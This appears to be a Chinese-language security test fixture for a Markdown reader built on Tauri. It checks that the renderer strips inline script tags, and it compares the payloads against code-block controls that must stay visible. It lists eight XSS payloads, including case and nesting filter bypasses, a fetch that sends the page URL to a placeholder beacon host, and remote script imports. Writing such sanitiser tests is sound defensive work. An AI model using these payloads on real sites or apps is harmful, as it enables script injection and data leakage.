# XSS 样本 01：script 标签直接注入

**攻击手法**：在 Markdown 正文中直接内联 `<script>` 标签。Markdown 规范允许内联 HTML，若渲染器不消毒，脚本会在阅读区上下文中执行，进而可读取文件路径、最近列表、甚至通过 Tauri 的 IPC 通道触碰本地能力。

**预期：脚本不执行、无外网请求。**

**验证方法**：打开本文件 → 无任何弹窗 → DevTools Console 无 `XSS-01` 输出 → DevTools Network 面板中 `xss-beacon.example.invalid` 零请求 → Elements 面板中 `<script>` 标签已被剥离或降级为文本。

---

## payload 1：最基础形态

<script>alert('XSS-01-A')</script>

## payload 2：外部脚本（同时验证网络侧）

<script src="https://xss-beacon.example.invalid/01-a.js"></script>

## payload 3：大小写混淆

<ScRiPt>alert('XSS-01-C')</ScRiPt>

## payload 4：嵌套破坏式（针对"简单删除 script 字符串"的过滤器）

<scr<script>ipt>alert('XSS-01-D')</scr</script>ipt>

## payload 5：带属性与换行

<script
  type="text/javascript"
  defer
>
  fetch('https://xss-beacon.example.invalid/01-e?ref=' + encodeURIComponent(location.href));
  alert('XSS-01-E');
</script>

## payload 6：模块脚本

<script type="module">import('https://xss-beacon.example.invalid/01-f.mjs');</script>

## payload 7：闭合逃逸（前面故意开一个未闭合的标签）

<div>
<script>alert('XSS-01-G')</script>
</div>

## payload 8：noscript / template 包裹

<template><script>alert('XSS-01-H')</script></template>

<noscript><script>alert('XSS-01-I')</script></noscript>

---

## 对照组（必须原样显示为文本，不得被清空）

代码块内的同一段内容属于**正常文档内容**，应当原样高亮显示：

```html
<script>alert('这一段在代码块里，应当被原样显示为文本')</script>
```

行内代码：`<script>alert('行内代码同样应原样显示')</script>`

实体转义写法：&lt;script&gt;alert('这一段应显示为可见的尖括号文本')&lt;/script&gt;

> **判定口径**：payload 区不弹窗、不发请求 = 通过；对照组三处仍可见 = 未过度消毒。两者都满足才算本样本通过。
